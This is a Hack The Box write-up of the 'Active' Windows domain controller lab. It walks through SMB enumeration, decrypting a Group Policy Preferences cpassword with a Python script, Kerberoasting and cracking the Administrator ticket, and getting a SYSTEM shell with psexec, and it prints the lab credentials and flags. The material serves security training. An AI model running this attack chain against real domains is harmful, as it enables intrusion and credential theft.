@@ -1,0 +1,515 @@
+#+TITLE: HTB - Active Raw
+#+AUTHOR: Leonardo Tamiano
+
+* Enum
+** nmap
+*** nmap -sC -sV -Pn active
+
+#+begin_example
+nmap -sC -sV -Pn active
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-24 09:48 EST
+Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 09:50 (0:00:28 remaining)
+Nmap scan report for active (10.10.10.100)
+Host is up (0.050s latency).
+Not shown: 982 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-24 14:48:47Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-12-24T14:49:43
+|_  start_date: 2023-12-24T14:35:48
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 71.10 seconds
+#+end_example
+
+*** nmap -p- -Pn active
+#+begin_example
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-24 09:49 EST
+Nmap scan report for active (10.10.10.100)
+Host is up (0.051s latency).
+Not shown: 65512 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5722/tcp  open  msdfsr
+9389/tcp  open  adws
+47001/tcp open  winrm
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+49170/tcp open  unknown
+49171/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 77.45 seconds
+#+end_example
+
+** smb (445/tcp)
+*** smbmap -H active
+#+begin_example
+kali@kali:~$ smbmap -H active         
+[+] IP: active:445..    Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+#+end_example
+
+*** smbclient //MOUNT/Replication -I active -N
+#+begin_example
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  active.htb                          D        0  Sat Jul 21 06:37:44 2018
+
+                5217023 blocks of size 4096. 284119 blocks available
+#+end_example
+
+*** crackmapexec smb active -u "" -p "" --shares
+#+begin_example
+SMB         active          445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         active          445    DC               [+] active.htb\: 
+SMB         active          445    DC               [+] Enumerated shares
+SMB         active          445    DC               Share           Permissions     Remark
+SMB         active          445    DC               -----           -----------     ------
+SMB         active          445    DC               ADMIN$                          Remote Admin
+SMB         active          445    DC               C$                              Default share
+SMB         active          445    DC               IPC$                            Remote IPC
+SMB         active          445    DC               NETLOGON                        Logon server share 
+SMB         active          445    DC               Replication     READ            
+SMB         active          445    DC               SYSVOL                          Logon server share 
+SMB         active          445    DC               Users                           
+#+end_example
+
+*** crackmapexec smb active -u "" -p "" -M spider_plus
+    #+begin_example
+SMB         active          445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb)MBv1:False)
+SMB         active          445    DC               [+] active.htb\: 
+SPIDER_P... active          445    DC               [*] Started spidering plus with option:
+SPIDER_P... active          445    DC               [*]        DIR: ['print$']
+SPIDER_P... active          445    DC               [*]        EXT: ['ico', 'lnk']
+SPIDER_P... active          445    DC               [*]       SIZE: 51200
+SPIDER_P... active          445    DC               [*]     OUTPUT: /tmp/cme_spider_plus
+    #+end_example
+*** smbget -a -R smb://active/Replication
+    #+begin_example
+smbget -a -R smb://active/Replication     
+Using workgroup WORKGROUP, guest user
+smb://active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                       smb://active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI                          smb://active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NTnf
+smb://active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Gsmb://active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol        smb://active/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                     smb://active/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NTnf
+Downloaded 8.11kB in 7 seconds
+    #+end_example
+
+    At the end we get the following file structure
+
+    *tree -L 8*
+
+    #+begin_example
+.
+├── DfsrPrivate
+│   ├── ConflictAndDeleted
+│   ├── Deleted
+│   └── Installing
+├── Policies
+│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
+│   │   ├── GPT.INI
+│   │   ├── Group Policy
+│   │   │   └── GPE.INI
+│   │   ├── MACHINE
+│   │   │   ├── Microsoft
+│   │   │   │   └── Windows NT
+│   │   │   │       └── SecEdit
+│   │   │   │           └── GptTmpl.inf
+│   │   │   ├── Preferences
+│   │   │   │   └── Groups
+│   │   │   │       └── Groups.xml
+│   │   │   └── Registry.pol
+│   │   └── USER
+│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
+│       ├── GPT.INI
+│       ├── MACHINE
+│       │   └── Microsoft
+│       │       └── Windows NT
+│       │           └── SecEdit
+│       │               └── GptTmpl.inf
+│       └── USER
+└── scripts
+
+22 directories, 7 files
+    #+end_example
+    
+*** crackmapexec smb active -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
+#+begin_example
+SMB         active          445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (S
+SMB         active          445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         active          445    DC               [+] Enumerated shares
+SMB         active          445    DC               Share           Permissions     Remark
+SMB         active          445    DC               -----           -----------     ------
+SMB         active          445    DC               ADMIN$                          Remote Admin
+SMB         active          445    DC               C$                              Default share
+SMB         active          445    DC               IPC$                            Remote IPC
+SMB         active          445    DC               NETLOGON        READ            Logon server share 
+SMB         active          445    DC               Replication     READ            
+SMB         active          445    DC               SYSVOL          READ            Logon server share 
+SMB         active          445    DC               Users           READ            
+#+end_example
+
+*** smbclient //MOUNT/Users -I active -U=SVC_TGS%GPPstillStandingStrong2k18
+
+** GPP (Group Policy Preferences)
+
+   *Groups.xml*
+   #+begin_src xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+   #+end_src
+
+** credentials
+   #+begin_example
+active.htb\SVC_TGS:GPPstillStandingStrong2k18
+   #+end_example
+
+   #+begin_example
+Administrator:Ticketmaster1968
+   #+end_example
+   
+** kerberoasting
+*** impacket-GetUserSPNs -dc-ip active active.htb/SVC_TGS:GPPstillStandingStrong2k18
+    #+begin_example
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-12-24 09:36:54.629350             
+
+    #+end_example
+
+*** kali@kali:~/repos/yt-en/htb/02-active$ impacket-GetUserSPNs -dc-ip active active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
+    #+begin_example
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-12-24 09:36:54.629350             
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d992ccb1549eb26f5c043e47fbba75c5$a80469e4c24692bbe6159108ef3edc953263a36894b3b85a0f6116854b592ca1f5d801cb333d547a349c794ee6a85d9b0eca778758232d447ed50fe818cb933c1a99161779ccbbde2bfb333552b0215dbd9a37db35da72c4b482f39f1f3b5f6eb4880b4cf90f698e64e0888293c35cc560cfaf24ac708e1b5eb370d4d98172482e34e6572e6fdd072dbce330da79c0af26df196d21578b19de860b577066a982c8edd078d0304e9b9c59480825dc74e8ce6e7fb7c36059c5bd7107f3f3433ec2a4dafdd1749e12374e26de0d3813dce1abd3836100bdaf018ec0f5488e87d807d971e562e1ce015af716aaf277d66d685e8020eacc8187aa0387b1e3af68e794a0f9bafb6fc916e207dd8babb7fe3e1df23d825e354f683b63e15d64ffe0258945d65459bb806b2ab520e94da259541b3f668fe3e1a803509e5916fa5261c6857b8ce05c741a8eb23e414637d4b292600c9113f4b51db4e2aef5f32a4868597e4d5de3173fb68a7a8ecc9df11c7c7dc284da5959af4028c287e495692f6c8ec8db4c3536ac553ee43e152ca977458e8bdfd3cd96f4c2b4558c33a2b9ac5f91b8c7785d8f8833737fb92dde1698981abdda1e95c2dccd0c4578ac9d5310d6a5fd6f75615fa5686fba34725a21de4399bd14d21446a64852525970332077a0ddeef36bbd6104e893489cfc5774a9354ab91f1be4a9728d3c8ad9ce47ae5f28255bcbe974ce7217b11037299c55a769f847a10af89e0d16b1222a9068c3a2ea0b57c82483c0bada234fb75768bc6147ffde3c5f0820a0fa2f15c3ccfb62520ee5c2084ccb1373e3fe9c917a06969d43666e0251dba702ae0e4704265f04febc5d3e2b09a3bcbb9f7fffc91acf68e9c0c3e3f09bcb003f5db65dfbc70a9000bc8a7021df4a59e1fe1ad03c9be15159352cc649e57994ee869428df4445640d9be9ca7ed04960afd4e56c30764d28526aa8074465bce6cfa7f2baaa221913a4e441ead587ec9a0108fe7a6727e2c8252317f4a102dc9124fb943e45b752154ea0da702583168202ea76443c63f3763a35e0ec680726a5e2d142c97cb11e46a3a0c694a343e0a10b683e7ab82be7a207f77e921086e3491d46071d1e097dc62fa748cb92715b48c5cffafff51bedeab8bd66f0f51d900bc071da5b2d60a8f91c006f623e12656f268606d630700eacefb0e880d3ab9c4ef8b5a5d2f346e953521bb85ab1614d60761ce4a8206245423fb46b347b6e1263e64af5e7215b
+   #+end_example
+
+** john
+*** john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+#+begin_example
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:08 DONE (2023-12-24 11:00) 0.1219g/s 1285Kp/s 1285Kc/s 1285KC/s Tiffani29..Thrasher
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+#+end_example
+
+* Foothold
+  Scans with nmap reveal bunch of ports open
+
+  #+begin_example
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-24 14:48:47Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+  #+end_example
+
+  Enumerating SMB shares we find an anonymous read-only open share
+
+  #+begin_example
+kali@kali:~$ smbmap -H active         
+[+] IP: active:445..    Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+  #+end_example
+
+  --------------------
+
+  *Vulnerability 1*: Anyone can access the Replication share offered by SMB.
+
+  --------------------
+
+  We can enumerate the content of SMB share with various tools
+
+  - smbmap -H active
+  - smbclient //MOUNT/Replication -I active -N
+  - crackmapexec smb active -u "" -p "" --shares
+  - crackmapexec smb active -u "" -p "" -M spider_plus
+  - smbget -a -R smb://active/Replication
+
+  --------------------
+
+  *Vulnerability 2*: Within the SMB share we get access to a GPP folder
+  which contains a *Groups.xml* file with a *cpassword* field in it. Even
+  though this password seem to be protected, it actually isn't,
+  because it was encrypted as part of Microsoft GPP, using an AES-256
+  keys that we know, because microsoft published it. This allows
+  anyone who has read-access to the file, to decrypt the plaintext
+  password of the user.
+
+  The key in particular is the following one
+
+  https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+  https://adsecurity.org/?p=2288
+  https://blog.netwrix.com/2022/10/06/compromising-plain-text-passwords-active-directory/
+  
+  #+begin_example
+ 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
+ f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
+  #+end_example
+
+  and the password is
+
+  #+begin_example
+(venv)kali@kali:~/repos/yt-en/htb/02-active/tools$ python3 gpp-decrypt.py
+GPPstillStandingStrong2k18
+  #+end_example
+
+  and it was obtained by the following python script
+
+  #+begin_src python
+#!/usr/bin/env python3
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+if __name__ == "__main__":
+    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
+    iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    
+    ciphertext = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ=="
+    ciphertext = base64.b64decode(ciphertext)
+
+    plaintext = cipher.decrypt(ciphertext)
+    plaintext = unpad(plaintext, AES.block_size)
+
+    print(plaintext.decode())
+  #+end_src
+
+  With this password we are authenticated to the domain
+
+  #+begin_example
+crackmapexec smb active -u SVC_TGS -p GPPstillStandingStrong2k18 --shares          
+SMB         active          445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (S
+SMB         active          445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         active          445    DC               [+] Enumerated shares
+SMB         active          445    DC               Share           Permissions     Remark
+SMB         active          445    DC               -----           -----------     ------
+SMB         active          445    DC               ADMIN$                          Remote Admin
+SMB         active          445    DC               C$                              Default share
+SMB         active          445    DC               IPC$                            Remote IPC
+SMB         active          445    DC               NETLOGON        READ            Logon server share 
+SMB         active          445    DC               Replication     READ            
+SMB         active          445    DC               SYSVOL          READ            Logon server share 
+SMB         active          445    DC               Users           READ            
+  #+end_example
+
+  In particular by authenticating to the ~Users~ share we are able to
+  read the user flag
+
+  #+begin_example
+smbclient //MOUNT/Users -I active -U=SVC_TGS%GPPstillStandingStrong2k18
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+
+                5217023 blocks of size 4096. 279116 blocks available
+smb: \> cd SVC_TGS
+smb: \SVC_TGS\> ls
+  .                                   D        0  Sat Jul 21 11:16:32 2018
+  ..                                  D        0  Sat Jul 21 11:16:32 2018
+  Contacts                            D        0  Sat Jul 21 11:14:11 2018
+  Desktop                             D        0  Sat Jul 21 11:14:42 2018
+  Downloads                           D        0  Sat Jul 21 11:14:23 2018
+  Favorites                           D        0  Sat Jul 21 11:14:44 2018
+  Links                               D        0  Sat Jul 21 11:14:57 2018
+  My Documents                        D        0  Sat Jul 21 11:15:03 2018
+  My Music                            D        0  Sat Jul 21 11:15:32 2018
+  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
+  My Videos                           D        0  Sat Jul 21 11:15:53 2018
+  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
+  Searches                            D        0  Sat Jul 21 11:16:24 2018
+
+                5217023 blocks of size 4096. 279116 blocks available
+smb: \SVC_TGS\> cd Desktop
+smb: \SVC_TGS\Desktop\> ls
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                           AR       34  Sun Dec 24 09:36:52 2023
+
+                5217023 blocks of size 4096. 279116 blocks available
+smb: \SVC_TGS\Desktop\> cat user.txt
+cat: command not found
+smb: \SVC_TGS\Desktop\> get user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \SVC_TGS\Desktop\> exit
+                                                                                                                                                                         kali@kali:~/repos/yt-en/htb/02-active$ cat user.txt                                                    
+d043c6c87d38257e3555aa4dd79c0f62
+  #+end_example
+  
+* Privilege Escalation
+  By doing a kerberoasting accoun with the ~active.htb\SVC_TGS~ account,
+  we're able to see that the administrator has an assocaited ~SPN~
+
+  #+begin_example
+impacket-GetUserSPNs -dc-ip active active.htb/SVC_TGS:GPPstillStandingStrong2k18
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-12-24 09:36:54.629350   
+  #+end_example
+
+  By requesting the TGS ticket we get
+
+  #+begin_example
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d992ccb1549eb26f5c043e47fbba75c5$a80469e4c24692bbe6159108ef3edc953263a36894b3b85a0f6116854b592ca1f5d801cb333d547a349c794ee6a85d9b0eca778758232d447ed50fe818cb933c1a99161779ccbbde2bfb333552b0215dbd9a37db35da72c4b482f39f1f3b5f6eb4880b4cf90f698e64e0888293c35cc560cfaf24ac708e1b5eb370d4d98172482e34e6572e6fdd072dbce330da79c0af26df196d21578b19de860b577066a982c8edd078d0304e9b9c59480825dc74e8ce6e7fb7c36059c5bd7107f3f3433ec2a4dafdd1749e12374e26de0d3813dce1abd3836100bdaf018ec0f5488e87d807d971e562e1ce015af716aaf277d66d685e8020eacc8187aa0387b1e3af68e794a0f9bafb6fc916e207dd8babb7fe3e1df23d825e354f683b63e15d64ffe0258945d65459bb806b2ab520e94da259541b3f668fe3e1a803509e5916fa5261c6857b8ce05c741a8eb23e414637d4b292600c9113f4b51db4e2aef5f32a4868597e4d5de3173fb68a7a8ecc9df11c7c7dc284da5959af4028c287e495692f6c8ec8db4c3536ac553ee43e152ca977458e8bdfd3cd96f4c2b4558c33a2b9ac5f91b8c7785d8f8833737fb92dde1698981abdda1e95c2dccd0c4578ac9d5310d6a5fd6f75615fa5686fba34725a21de4399bd14d21446a64852525970332077a0ddeef36bbd6104e893489cfc5774a9354ab91f1be4a9728d3c8ad9ce47ae5f28255bcbe974ce7217b11037299c55a769f847a10af89e0d16b1222a9068c3a2ea0b57c82483c0bada234fb75768bc6147ffde3c5f0820a0fa2f15c3ccfb62520ee5c2084ccb1373e3fe9c917a06969d43666e0251dba702ae0e4704265f04febc5d3e2b09a3bcbb9f7fffc91acf68e9c0c3e3f09bcb003f5db65dfbc70a9000bc8a7021df4a59e1fe1ad03c9be15159352cc649e57994ee869428df4445640d9be9ca7ed04960afd4e56c30764d28526aa8074465bce6cfa7f2baaa221913a4e441ead587ec9a0108fe7a6727e2c8252317f4a102dc9124fb943e45b752154ea0da702583168202ea76443c63f3763a35e0ec680726a5e2d142c97cb11e46a3a0c694a343e0a10b683e7ab82be7a207f77e921086e3491d46071d1e097dc62fa748cb92715b48c5cffafff51bedeab8bd66f0f51d900bc071da5b2d60a8f91c006f623e12656f268606d630700eacefb0e880d3ab9c4ef8b5a5d2f346e953521bb85ab1614d60761ce4a8206245423fb46b347b6e1263e64af5e7215b
+  #+end_example
+
+  By cracking the ticket with ~john~ we recover the password
+
+  #+begin_example
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:08 DONE (2023-12-24 11:00) 0.1219g/s 1285Kp/s 1285Kc/s 1285KC/s Tiffani29..Thrasher
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+  #+end_example
+
+  and with crackmapexec we can check that we're able to auth with administrator
+
+  #+begin_example
+crackmapexec smb active -u Administrator -p Ticketmaster1968          
+SMB         active          445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         active          445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
+  #+end_example
+
+  ---------
+
+  *Vulnerability*: We were able to crack the password of administrator.
+
+  This allows us to login with SMB into the machine as administrator.
+
+  ---------
+
+  Finally, to spawn a shell on the target, we can use ~psexec.py~
+
+  #+begin_example
+impacket-psexec active.htb/administrator@10.10.10.100                                    
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file DtfeFzTI.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service IOHP on 10.10.10.100.....
+[*] Starting service IOHP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+  #+end_example
+  
+* Flags
+  *user.txt*
+  #+begin_example
+d043c6c87d38257e3555aa4dd79c0f62
+  #+end_example
+
+  *root.txt*
+  #+begin_example
+6dc7a026f900560263844a1cd8dd5533
+  #+end_example
